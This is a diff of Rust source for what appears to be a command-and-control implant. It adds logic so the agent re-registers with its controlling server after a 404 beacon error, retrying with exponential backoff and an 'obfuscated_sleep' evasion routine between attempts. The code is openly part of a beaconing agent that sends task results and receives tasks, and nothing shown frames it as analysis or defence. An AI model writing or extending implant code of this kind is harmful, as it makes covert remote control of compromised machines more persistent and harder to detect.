@@ -133,7 +133,26 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
         crate::dbg_log!("beaconing ({} pending results)...", beacon.results.len());
         let resp = match transport.beacon(&beacon).await {
             Ok(r)  => { crate::dbg_log!("beacon ok — {} tasks", r.tasks.len()); r }
-            Err(e) => { crate::dbg_log!("beacon error: {e}"); continue; }
+            Err(e) => {
+                let emsg = e.to_string();
+                crate::dbg_log!("beacon error: {emsg}");
+                // 404 means the server lost our registration (restart or heartbeat eviction) — re-register
+                if emsg.contains("404") || emsg.contains("Not Found") {
+                    crate::dbg_log!("server doesn't know us — re-registering");
+                    let mut backoff = 1u64;
+                    loop {
+                        match transport.register(&reg).await {
+                            Ok(_)  => { crate::dbg_log!("re-registration ok"); break; }
+                            Err(e2) => {
+                                crate::dbg_log!("re-registration failed: {e2}");
+                                evasion::obfuscated_sleep(backoff * 1000, &cfg.sleep_obf).await;
+                                backoff = (backoff * 2).min(300);
+                            }
+                        }
+                    }
+                }
+                continue;
+            }
         };
 
         if resp.kill { return Ok(()); }
